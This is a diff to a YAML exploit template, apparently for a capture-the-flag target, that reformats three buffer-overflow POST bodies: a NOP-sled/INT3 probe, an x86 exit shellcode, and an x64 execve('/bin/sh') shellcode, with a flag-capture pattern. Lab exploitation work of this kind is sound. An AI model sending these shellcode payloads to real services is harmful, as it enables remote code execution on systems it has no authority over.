@@ -40,7 +40,8 @@ detection_paths:
           method: POST
           path: '/input_service' # Example endpoint for interaction
           # Conceptual payload: padding + NOP sled + INT3 (breakpoint) + return address
-          body: 'A' * 100 + '\x90' * 50 + '\xcc' + 'BBBBBBBB' # 100 A's, 50 NOPs, INT3, return address placeholder
+          body: >-
+            'A' * 100 + '\x90' * 50 + '\xcc' + 'BBBBBBBB'
         signals:
           - match: '(?i)debugger attached|process stopped|segmentation fault' # Indicators of breakpoint/crash
             on_match:
@@ -65,7 +66,8 @@ detection_paths:
           method: POST
           path: '/input_service'
           # Conceptual payload: padding + _exit(0) shellcode + return address
-          body: 'A' * 100 + '\x31\xc0\xb0\x01\x31\xdb\xcd\x80' + 'BBBBBBBB' # NOP sled + exit(0) for x86
+          body: >-
+            'A' * 100 + '\x31\xc0\xb0\x01\x31\xdb\xcd\x80' + 'BBBBBBBB'
         signals:
           - match: '(?i)connection closed|program terminated' # If the program cleanly exits
             on_match:
@@ -89,7 +91,8 @@ exploitation_paths:
           path: '/input_service'
           # Conceptual payload: padding + NOP sled + /bin/sh shellcode + return address
           # Example x64 execve("/bin/sh") shellcode (null-free)
-          body: 'A' * 100 + '\x90' * 10 + '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05' + 'BBBBBBBB'
+          body: >-
+            'A' * 100 + '\x90' * 10 + '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05' + 'BBBBBBBB'
         capture:
           - pattern: 'flag\{[^}]+\}'
             as: flag_value
